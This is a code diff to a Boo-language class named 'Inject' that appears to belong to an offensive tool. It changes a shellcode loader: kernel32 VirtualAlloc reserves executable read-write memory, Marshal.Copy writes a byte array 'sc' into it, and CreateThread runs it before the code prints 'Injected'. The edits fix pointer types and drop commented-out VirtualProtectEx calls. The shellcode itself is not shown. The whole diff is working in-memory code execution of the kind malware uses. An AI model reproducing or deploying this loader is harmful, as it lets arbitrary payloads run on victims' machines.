@@ -41,11 +41,11 @@ class Inject:
         pass
 
     [DllImport("kernel32.dll")]
-    def VirtualAlloc(lpStartAddr as int, size as int, flAllocationType as uint, flProtect as uint) as int:
+    def VirtualAlloc(lpStartAddr as int, size as int, flAllocationType as uint, flProtect as uint) as IntPtr:
         pass
 
     [DllImport("kernel32.dll")]
-    def CreateThread(lpThreadAttributes as int, dwStackSize as int, lpStartAddress as int, param as int, dwCreationFlags as int, lpThreadId as int) as int:
+    def CreateThread(lpThreadAttributes as int, dwStackSize as int, lpStartAddress as IntPtr, param as int, dwCreationFlags as int, lpThreadId as int) as int:
         pass
 
     [DllImport("kernel32.dll")]
@@ -101,20 +101,17 @@ class Inject:
         MEM_COMMIT = 0x1000 cast uint
         PAGE_EXECUTE_READWRITE = 0x40 cast uint
 
-        currentProcess = Process.GetCurrentProcess()
+        funcAddr = VirtualAlloc(0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        print "funcAddr = $funcAddr"
+
+        Marshal.Copy(sc, 0 , funcAddr cast IntPtr, sc.Length)
+
         threadId = 0
         pinfo = 0
 
-        funcAddr = VirtualAlloc(0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-        print "funcAddr = $funcAddr"
-        Marshal.Copy(sc, 0 , funcAddr cast IntPtr, sc.Length)
-
-        //oldProtect as uint = 0
-        //resultBool = VirtualProtectEx(currentProcess.Handle cast IntPtr, funcAddr cast IntPtr, sc.Length, PAGE_EXECUTE_READWRITE, oldProtect)
-        //print "VirtualProtectEx = $resultBool, oldProtect = $oldProtect"
-
         hThread = CreateThread(0, 0, funcAddr, pinfo, 0 ,threadId)
         print "hThread = $hThread"
+
         WaitForSingleObject(hThread, 0xFFFFFFFF)
         print "Injected"
 
